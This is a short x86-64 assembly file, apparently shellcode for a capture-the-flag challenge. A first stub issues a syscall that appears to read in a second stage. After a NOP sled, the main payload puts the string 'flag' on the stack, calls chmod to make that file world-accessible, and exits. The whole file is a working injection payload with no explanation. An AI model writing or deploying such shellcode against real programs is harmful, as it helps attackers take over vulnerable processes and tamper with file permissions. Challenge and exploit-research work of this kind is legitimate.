.intel_syntax noprefix


push rax
pop rdi
push rdx
pop rsi

syscall


nop
nop
nop
xor rax, rax
mov al, 90
mov rbx, 0x67616c66
push rbx
push rsp
pop rdi
xor rsi, rsi
mov sil, 7
syscall

xor rax, rax
mov al, 60
xor rdi, rdi
syscall
